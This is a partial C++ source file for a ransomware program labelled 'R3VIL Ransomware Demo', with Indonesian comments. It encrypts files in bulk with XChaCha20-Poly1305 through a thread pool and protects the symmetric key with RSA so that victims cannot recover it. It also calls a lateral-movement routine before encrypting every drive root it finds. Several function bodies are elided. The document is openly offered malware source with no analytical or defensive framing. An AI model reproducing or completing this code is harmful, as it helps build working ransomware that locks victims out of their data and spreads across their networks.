// r3vil.cpp - R3VIL Ransomware Demo with GUI + XChaCha20Poly1305 (24-byte nonce)
#include <cryptopp/cryptlib.h>
#include <cryptopp/osrng.h>
#include <cryptopp/chachapoly.h>      // XChaCha20Poly1305
#include <cryptopp/rsa.h>             // ← TAMBAHAN PENTING untuk RSA
#include <cryptopp/pkcspad.h>         // ← Untuk OAEP SHA
...
// ====================== ENCRYPT FILE - XChaCha20Poly1305 24-byte Nonce ======================
void encrypt_file(const std::string& filepath, const SecByteBlock& key, const byte* nonce) {
    try {
        std::lock_guard<std::mutex> lock(log_mutex);
        std::cout << "  [*] Encrypting (XChaCha20-Poly1305 24-byte): " << filepath << "\n";

        std::string plaintext;
        FileSource(filepath.c_str(), true, new StringSink(plaintext));

        XChaCha20Poly1305::Encryption enc;
        enc.SetKeyWithIV(key, key.size(), nonce, 24);
...
void encrypt_directory(const std::string& root, const SecByteBlock& key, const byte* nonce) {
    ...
    for (const auto& f : files) {
        pool.enqueue([&f, &key, nonce]() { encrypt_file(f, key, nonce); });
    }
}

// ====================== PERFORM LATERAL MOVEMENT ======================
void perform_lateral_movement(const SecByteBlock& key, const byte* nonce) {
...
int main() {
    ...
    std::cout << "\n========================================\n";
    std::cout << "     RANSOMWARE DEMO - XChaCha20Poly1305 (24-byte nonce)     \n";
    std::cout << "========================================\n\n";
    ...
    std::cout << "[*] Encrypting symmetric key with RSA Public Key...\n";
    try {
        RSA::PublicKey pub;
        ...
        std::cout << "[✓] Symmetric key successfully encrypted and saved to aes_key.enc\n";
    } catch (const std::exception& e) {
        std::cout << "[✗] Failed to encrypt symmetric key: " << e.what() << std::endl;
        return 1;
    }

    perform_lateral_movement(key, nonce);

    std::cout << "\n[*] Starting file encryption with XChaCha20Poly1305...\n";
    auto roots = get_all_roots();
    for (const auto& root : roots) {
        encrypt_directory(root, key, nonce);
    }
